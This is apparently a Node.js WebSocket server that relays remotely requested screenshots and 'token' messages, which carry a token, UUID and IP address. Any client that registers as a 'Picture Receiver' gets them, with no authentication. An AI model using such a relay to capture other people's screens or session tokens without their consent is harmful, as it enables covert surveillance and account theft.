import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';

const app = express();
app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

const usersInChat = new Map();
const pictureReceivers = new Map(); 
let keepAliveId = null;

wss.on("connection", (ws) => {
    const userID = crypto.randomUUID();  

    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        handleDisconnect(userID);
        ws.removeAllListeners(); 
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

// Add route to check Node.js version
app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

const handleMessage = (ws, data, userID) => {
    try {
        const messageData = JSON.parse(data.toString());
        
        if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
            // Xử lý tin nhắn token đặc biệt
            console.log('Received token message from:', messageData.sender);
            broadcastToPictureReceivers(messageData);
        } else if (messageData.action === 'take_screenshot1' || messageData.command) {
            // Đây là command, không cần broadcast
            console.log('Received command:', messageData);
        } else {
            // Broadcast các message khác, nếu cần
            broadcastToAllExceptSender(ws, JSON.stringify(messageData));
        }
    } catch (e) {
        console.error('Error parsing or processing message:', e);
        console.error('Raw message data:', data);
    }
};

// Hàm broadcastToPictureReceivers cần được cập nhật để xử lý cả object và string
const broadcastToPictureReceivers = (message) => {
    const data = typeof message === 'string' ? message : JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
};

const broadcastToAllExceptSender = (senderWs, message) => {
    wss.clients.forEach(client => {
        if (client !== senderWs && client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};
